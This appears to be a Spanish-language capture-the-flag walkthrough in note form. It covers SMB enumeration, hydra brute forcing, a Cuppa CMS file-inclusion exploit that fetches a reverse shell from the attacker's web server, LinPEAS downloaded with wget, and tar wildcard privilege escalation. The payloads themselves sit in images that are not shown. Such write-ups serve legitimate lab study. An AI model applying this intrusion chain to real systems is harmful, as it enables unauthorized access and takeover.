- Empezamos enumerando los puertos con ==nmap==, teniendo los puertos 139, 80, 445, 143, 110 y 22, siendo el 445 de importancia ya que es un puerto donde se ejecuta ==samba==.
- Ahora usamos ==gobuster== para encontrar algún directorio.
- Podemos ver que se ejecuta ambien ==smbd== así que vamos a usar ==smbclient==
```
smbclient -L (IP_VICTIMA)
```
![[Pasted image 20250125193854.png]]
- Vamos a ver el directorio ==anonymous==. Para eso utilizamos el siguiente comando:
```
smbclient //(IP_VICTIMA)/(NOMBRE_DIRECTORIO)
```
![[Pasted image 20250125194134.png]]
- Estamos dentro a ese recurso.
- Para listar usamos el comando `dir`
![[Pasted image 20250125194220.png]]
- Ahora sabemos que tenemos a nuestra disposición esta información por el recurso ==anonymous==.
- Ahora, vamos a descargar todos los archivos de ese recurso con el siguiente comando:
```
smbget -R smb://(IP_VICTIMA)/(RECURSO)
```
- Si no resulta este comando usamos solo el comando `get.
![[Pasted image 20250125200725.png]]
- Descargamos un archivo con contraseñas.
- Gobuster nos arrojo una pagina de correos.
![[Pasted image 20250125201111.png]]
- Ya que tenemos la contraseña y un posible usuario, vamos a usar burpsuite para entrar.
![[Pasted image 20250125201400.png]]
- Ahora nos vamos al terminal y usamos ==hydra==.
![[Pasted image 20250125202020.png]]
- La primera parte después del " es la URL que cambia cuando nos equivocamos con la contraseña.
![[Pasted image 20250125202133.png]]
- Ya tenemos credenciales.
- Ya dentro y con esta password
![[Pasted image 20250125202457.png]]
- Podemos entrar al smb.
```
smbclient -U (NOMBRE_USUARIO) //(IP_VICTIMA)/(RECURSO)
```
![[Pasted image 20250125202808.png]]
- Buscando encontramos este directorio
![[Pasted image 20250125203333.png]]
- Así que vamos a enumerar rutas bajo esta ruta.
- Usamos ==gobuster==
```
gobuster dir -u http://10.10.33.74/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -r
```
- Tenemos otro directorio.
![[Pasted image 20250125203712.png]]
![[Pasted image 20250125203738.png]]
- Tenemos 2 posibles credenciales.
- En este caso ninguna de las que ya tenemos funciona.
- Vamos a buscar un sploit que nos funciona.
- Vamos a la pagina exploit-db.com
- Buscamos por Cuppa.
![[Pasted image 20250125204037.png]]
-  El exploit nos muestra 2 formas posibles de explotarlo
![[Pasted image 20250125204517.png]]
- Siendo el primero que nos permite ejecutar programas de la maquina atacante desde la maquina victima y el segundo si ponemos /alerts hacia adelante en la URL nos permite visualizar el archivo passwd donde podremos sacar algunas credenciales.
- En este caso vamos a seleccionar la primera.
- Vamos a hacer un one liner (reverse) con nano.
- Ya creado, con python levantamos un servidor web.
```
python3 -m http.server 80
```
- Ya creado, copiamos la primera ruta y la pegamos en el URL
![[Pasted image 20250125205826.png]]
- Ya estamos dentro.
![[Pasted image 20250125210457.png]]
- Vamos a usar la herramenta ==LinPEAS== vamos a buscar vulnerabilidades en la maquina.
- Como vemos que la maquina victima es x64 tenemos que descargarnos la herramienta para esa maquina.
![[Pasted image 20250125210904.png]]
- Ahora tenemos que subir el ejecutable con python.
- Para pasarlo, desde la maquina victima usamos el siguiente comando:
```
wget http://(IP_ATACANTE):(PUERTO)/(NOMBRE_ARCHIVO)
```
==Se recomienda descargarlo en el fichero /tmp ya que es menos conflictivo al momento de pasarse archivos.==
![[Pasted image 20250125211518.png]]
- Le damos permiso de ejecución.
- Ejecutamos
```
./lin
```
![[Pasted image 20250125212258.png]]
- Vamos a utilizar esto que nos dice que cada 1 minutos se ejecuta backup.sh en usuario root.
- Hay que acceder a esa ruta.
![[Pasted image 20250125212418.png]]
![[Pasted image 20250125212455.png]]
- Ya que podemos ver el ejecutable vamos a usar `cat` para leer el ejecutable.
![[Pasted image 20250125212616.png]]
- Como podemos ver:
	- Nos crea un /bin/bash.
	- Se mueve a la carpeta /html
	- Usa `tar` que sirve para extraer los archivos acompañado de `cf` que agrupa varios archivos en un archivo comprimido que en este caso seria backup.tgz
- Ahora es la escala de privilegios.
- Para explicar esto nos meteremos a esta pagina: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
- Vamos a ocupar este metodo.
![[Pasted image 20250125213519.png]]
- La segunda línea y tercera.
- Estos archivos lo tenemos que crear en /var/www/html
![[Pasted image 20250125213737.png]]
![[Pasted image 20250125213838.png]]
- Ahora nos creamos un archivo shell.sh con nano.
- Agregamos este comando.
![[Pasted image 20250125214718.png]]
![[Pasted image 20250125215417.png]]
